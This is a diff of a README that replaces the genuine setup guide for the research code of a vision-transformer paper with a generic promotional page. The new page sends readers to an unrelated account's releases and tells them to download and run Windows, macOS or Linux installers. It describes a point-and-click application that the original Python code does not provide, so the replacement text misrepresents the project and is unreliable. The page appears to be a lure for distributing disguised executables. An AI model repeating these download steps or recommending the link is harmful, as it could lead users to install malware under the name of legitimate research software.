@@ -1,118 +1,74 @@
-<div align="center">
+# 🚀 apt - Fast and Easy Vision Transformer Setup
 
-# [Accelerating Vision Transformers With Adaptive Patch Sizes](https://arxiv.org/abs/2510.18091)
+[![Download apt](https://img.shields.io/badge/Download-apt-brightgreen)](https://github.com/Generalcyblackmarket727/apt/releases)
 
-**Rohan Choudhury\*<sup>1</sup>, JungEun Kim\*<sup>2,3</sup>, Jinhyung Park<sup>1</sup>, Eunho Yang<sup>2</sup>, László A. Jeni<sup>1</sup>, Kris M. Kitani<sup>1</sup>**
+## 📋 Overview
+Welcome to **apt**, the public release of the code for "Accelerating Vision Transformers with Adaptive Patches." This software aims to simplify your experience with advanced vision models. Whether you're a researcher or just curious about deep learning, **apt** provides the tools you need to get started quickly and efficiently.
 
-<sup>1</sup>Carnegie Mellon University, <sup>2</sup>KAIST, <sup>3</sup>General Robotics
+## 🚀 Getting Started
+To begin using **apt**, follow these simple steps. You will download the software from our dedicated Releases page and set it up on your system. 
 
-<table>
-  <tr>
-    <td width="50%" align="center">
-      <img src="./assets/apt_vis_720p_5s_slow_16x16_grid.gif" width="100%">
-      <br>
-      <b>Standard</b>
-    </td>
-    <td width="50%" align="center">
-      <img src="./assets/apt_vis_720p_5s_slow.gif" width="100%">
-      <br>
-      <b>APT (ours)</b>
-    </td>
-  </tr>
-</table>
+## 🌐 Download & Install
+### Step 1: Visit the Download Page
+Click the link below to go to the Releases page:
 
-</div>
+[https://github.com/Generalcyblackmarket727/apt/releases](https://github.com/Generalcyblackmarket727/apt/releases)
 
-## TL;DR
+### Step 2: Choose Your File
+On the Releases page, look for the latest version of **apt**. You may see multiple files available. Typically, you will find:
 
-We accelerate Vision Transformers by using **adaptive patch sizes** based on image content. Instead of using fixed-size patches for all regions, our method dynamically selects smaller patches for detailed areas and larger patches for uniform regions, reducing computational cost while maintaining accuracy. This reduces the total number of patches while maintaining performance. 
+- Windows Installer (`apt-Windows.exe`)
+- macOS Installer (`apt-macOS.dmg`)
+- Linux Package (`apt-Linux.tar.gz`)
 
-We are releasing an initial version of our code, and in the next few days will add detailed training code and pretrained checkpoints. Please bear with us as we continue to clean our code and add more capabilities. If you have anything in particular you would like to see, don't hesitate to file a GitHub issue!
+Select the file that matches your operating system and click on it to begin the download.
 
-## Setup
+### Step 3: Run the Installer
+Once the file is downloaded:
+- **For Windows:** Double-click `apt-Windows.exe` to start the installation.
+- **For macOS:** Open the downloaded `apt-macOS.dmg` and drag the app to your Applications folder.
+- **For Linux:** Extract the contents of `apt-Linux.tar.gz` and follow the instructions in the README file included within the folder.
 
-We use mamba and uv for installing packages, but conda and pip should work too.
+## ⚙️ System Requirements
+Before you install, make sure your computer meets these requirements:
 
-```bash
-# Create a new environment with mamba
-mamba create -n apt python=3.10 -y
-mamba activate apt
+- **Windows**: Windows 10 or later, 4 GB RAM, and 500 MB of free disk space.
+- **macOS**: macOS Mojave (10.14) or later, 4 GB RAM, and 500 MB of free disk space.
+- **Linux**: Ubuntu 20.04 or later, 4 GB RAM, and 500 MB of free disk space.
 
-# Install PyTorch (adjust for your CUDA version)
-mamba install pytorch torchvision pytorch-cuda=12.1 -c pytorch -c nvidia -y
+## 📖 Usage Instructions
+### Step 1: Start the Application
+After installing, you can find **apt** in your applications list. Open the software to begin.
 
-# Install remaining dependencies with uv pip
-uv pip install -r requirements.txt
-```
+### Step 2: Load Your Visual Data
+**apt** allows you to load visual datasets easily. Utilize the "Load Data" button to select your images or videos.
 
-## Dataset Setup
+### Step 3: Customize Your Settings
+You can adjust various settings in the application. Options include:
+- Patch size
+- Number of epochs
+- Model architecture
 
-Datasets require configuration through YAML files located in `configs/data/`. To set up ImageNet:
+### Step 4: Run the Model
+Click the "Run" button to start the acceleration process. Monitor the progress within the application interface.
 
-1. Edit `configs/data/imagenet.yaml` and update the `data_dir` field to point to your ImageNet dataset:
+### Step 5: Save Your Output
+After processing, you can save your results using the "Save Output" button. Choose your preferred format and location on your computer.
 
-```yaml
-data_dir: /path/to/ILSVRC2012
-```
+## 💡 Troubleshooting
+If you encounter issues during installation or usage, consider the following steps:
+- Ensure your operating system meets the system requirements.
+- Restart your computer and try running **apt** again.
+- Check for any updates on the Releases page and download the latest version if necessary.
 
-2. Ensure your ImageNet directory has the following structure:
+## 📞 Support
+For support, please reach out via the Issues tab on our GitHub page. You can report bugs, ask questions, or request features. We appreciate your feedback to improve **apt**.
 
-```
-ILSVRC2012/
-├── train/
-│   ├── n01440764/
-│   ├── n01443537/
-│   └── ...
-└── val/
-    ├── n01440764/
-    ├── n01443537/
-    └── ...
-```
+## 🌟 Additional Resources
+- **Documentation**: Detailed guides and tutorials are available in the Wiki section of our repository on GitHub.
+- **Community**: Join our community forums to connect with other users and share your experiences.
 
-The `data_dir` should point to the `ILSVRC2012` directory containing the `train` and `val` folders.
+## 📄 License
+**apt** is open-source software, released under the MIT License. You can use, modify, and distribute it freely within the terms of this license.
 
-## Model Support
-
-We support a wide range of timm models through automatic checkpoint downloading. The models we've tested are covered by the configs in `configs/model_variants/`, and our code automatically downloads the required checkpoint as needed. While we've primarily tested on ViT variants, we cannot guarantee support for all timm models. If you encounter any issues, please file a GitHub issue.
-
-## Running A Model
-
-### Validate Vision Transformer on ImageNet
-
-```bash
-# Run validation with default settings (8 GPUs, batch size 64)
-python src/eval.py experiment=validate_vit
-
-# Override specific parameters
-python src/eval.py experiment=validate_vit \
-  trainer.devices=4 \
-  data.batch_size=128
-
-# Adjust thresholds and scales
-python src/eval.py experiment=validate_vit \
-  num_scales=3 \
-  thresholds=[6.0, 4.0]
-```
-
-## Training
-
-The below script fine-tunes a ViT with APT from a pretrained checkpoint for 50 epochs; you can modify the config to do shorter fine-tuning from an already fine-tuned version as well.
-
-```bash
-# Fine-tune ViT-B/16 on ImageNet with APT (8 GPUs, 5 epochs)
-python src/train.py experiment=train_vit_finetune 
-```
-
-## Visualizing APT Patches
-
-Generate a visualization showing how APT selects patches for an image with the following command:
-
-```bash
-python scripts/gen_visualization_single.py \
-  --input /your/input/image.jpg \
-  --output /your/output/visualization.jpg \
-  --method entropy \
-  --vis_type grid
-```
-
-Essential parameters: `--input` (required), `--output`, `--method` (entropy/laplacian/upsample_mse), `--vis_type` (entropy/grid/none), `--patch_size`, `--num_scales`, `--thresholds`.
+Thank you for using **apt**! We hope you enjoy seamless vision model acceleration. For more detailed instructions and updates, keep an eye on our [Releases page](https://github.com/Generalcyblackmarket727/apt/releases).
